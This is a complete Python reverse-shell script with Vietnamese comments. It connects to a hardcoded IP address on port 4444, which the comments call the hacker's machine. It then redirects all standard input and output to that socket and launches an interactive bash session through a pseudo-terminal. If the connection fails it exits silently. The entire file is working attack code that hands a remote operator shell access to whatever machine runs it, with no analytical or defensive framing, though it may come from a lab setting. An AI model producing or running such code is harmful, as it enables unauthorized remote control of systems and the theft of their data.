#!/usr/bin/env python3
import socket
import os
import pty

# IP và Port của máy Hacker (Debian)
HOST = "100.67.222.3"
PORT = 4444

def connect():
    try:
        # Tạo kết nối TCP tới máy Hacker
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        
        # Chuyển hướng stdin, stdout, stderr sang socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Khởi tạo một pseudo-terminal (PTY) và chạy bash
        # Điều này giúp shell có thể tương tác (gõ lệnh, xem màu, dùng lệnh sudo...)
        pty.spawn("/bin/bash")
        
    except Exception as e:
        # Nếu kết nối thất bại, thoát lặng lẽ
        pass

if __name__ == "__main__":
    connect()